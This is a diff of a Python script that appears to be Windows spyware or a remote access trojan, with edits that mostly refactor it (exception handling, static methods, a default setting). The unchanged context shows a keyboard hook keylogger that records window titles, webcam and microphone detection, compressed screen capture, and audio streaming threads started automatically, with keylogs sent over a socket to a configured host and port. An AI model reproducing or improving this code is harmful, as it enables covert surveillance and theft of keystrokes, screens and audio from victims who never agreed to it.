@@ -15,8 +15,6 @@ import sched
 import datetime
 import zlib
 
-import wave
-
 HOST = '127.0.0.1'
 PORT = 4434
 ACTIVE = False
@@ -46,7 +44,7 @@ try:
     cam = vidcap.new_Dev(0, 0)
     web_camera_input = str(cam.getdisplayname())
     del cam
-except:
+except (IOError, NameError, ImportError):
     web_camera_input = 'NoDevice'
 
 try:
@@ -55,7 +53,7 @@ try:
     device_name = p.get_default_input_device_info()
     del p
     audio_input = device_name['name']
-except (IOError, NameError):
+except (IOError, NameError, ImportError):
     audio_input = 'NoDevice'
 
 # Init Winapi
@@ -139,7 +137,7 @@ def init():
     else:
         variables = {
             'i': '',
-            'kts': True,
+            'kts': False,
             'kt': 30,
             'ats': False,
             'at': 30,
@@ -184,7 +182,6 @@ def screen_bits():
     return zlib.compress(p_buf)
 
 
-# TODO: Keylogger, Scheduler
 def send_keylog():
     global GLOBAL_SOCKET
     global ACTIVE
@@ -266,13 +263,15 @@ class Key(threading.Thread):
 
         global KEY_LOGS
 
-    def update_key(self, k):
+    @staticmethod
+    def update_key(k):
         if updatecode.has_key(k):
             return updatecode[k]
         else:
             return str(chr(k))
 
-    def write_key(self, log):
+    @staticmethod
+    def write_key(log):
         global CURRENT_WINDOW_TITLE
 
         new_window_title = get_window_title()
@@ -310,7 +309,8 @@ class Key(threading.Thread):
         self.write_key(key)
         return User32.CallNextHookEx(self.keyLogger.hooked, n_code, w_param, l_param)
 
-    def start_keylogger(self):
+    @staticmethod
+    def start_keylogger():
         msg = MSG()
         User32.GetMessageA(ctypes.byref(msg), 0, 0, 0)
 
@@ -359,6 +359,7 @@ class AudioStreaming(threading.Thread):
         self.stream.close()
         self.p.terminate()
 
+
 # Screen Shots
 class Screenshoter(threading.Thread):
 
@@ -388,6 +389,7 @@ screenshoter = Screenshoter()
 screenshoter.start()
 audioLogger = AudioStreaming(5120)
 audioLogger.start()
+
 
 def check_info():
     global UNLOCKED
